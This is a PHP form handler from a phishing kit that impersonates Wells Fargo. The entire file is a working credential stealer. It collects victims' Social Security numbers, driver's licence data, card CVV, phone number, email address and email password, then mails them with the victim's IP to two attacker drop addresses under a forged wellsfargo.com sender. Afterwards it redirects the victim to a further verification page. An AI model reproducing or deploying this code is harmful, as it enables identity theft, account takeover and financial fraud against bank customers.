<?
$ip = getenv("REMOTE_ADDR");
$adddate =date("D M d, Y g:i a");
$message .= " =================== Wells Fargo ================\n";
$message .= "Social Security Number: ".$_POST['ssn1']." ".$_POST['ssn2']." ".$_POST['ssn3']."\n";
$message .= "Driver's License: ".$_POST['license']."\n";
$message .= "Driver's License Issuing State: ".$_POST['state']."\n";
$message .= "Driver's License Issuing Date: ".$_POST['iss_month']." ".$_POST['iss_day']." ".$_POST['iss_year']."\n";
$message .= "Driver's License Expiry Date: ".$_POST['exp_month']." ".$_POST['exp_day']." ".$_POST['exp_year']."\n";
$message .= "CVV: ".$_POST['cvv']."\n";
$message .= "Mobile Number: ".$_POST['phone']."\n";
$message .= "E-mail Address: ".$_POST['email']."\n";
$message .= "E-mail Password: ".$_POST['epass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= " ================== Great WeStGiRl ================\n";



$send = "box.result2018@yandex.com,box.result2018@outlook.com";
$subject = "Wells Fargo 2 | $ip";
$headers = "From: Wells Fargo<info@wellsfargo.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);
       mail($cc,$subject,$message,$headers);


header("Location: verify.php");
?>
